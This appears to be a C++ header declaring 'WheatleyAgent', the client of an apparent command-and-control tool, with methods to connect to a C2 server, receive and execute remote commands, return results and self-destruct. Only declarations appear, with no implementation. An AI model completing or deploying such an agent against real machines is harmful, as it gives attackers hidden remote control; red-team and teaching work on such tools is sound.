#pragma once

#include <string>
#include <TcpConnection.hpp>
#include <WheatleyProto.hpp>

class WheatleyAgent {
public:
    WheatleyAgent();
    ~WheatleyAgent();

    // Disable copying for RAII integrity
    WheatleyAgent(const WheatleyAgent&) = delete;
    WheatleyAgent& operator=(const WheatleyAgent&) = delete;

    void run(const std::string& ip, int port);

private:
    void c2Connect(const std::string& ip, int port);
    void c2Disconnect();

    agent::command::Request recvCommandRequest();
    agent::command::Response processCommandRequest(agent::command::Request& request);
    void sendCommandResponse(agent::command::Response& response);

    std::string handleExecute(const std::string& command);
    void handleSelfDestroy();

    std::unique_ptr<TcpConnection> m_connection;
    bool isDestroyed;
};
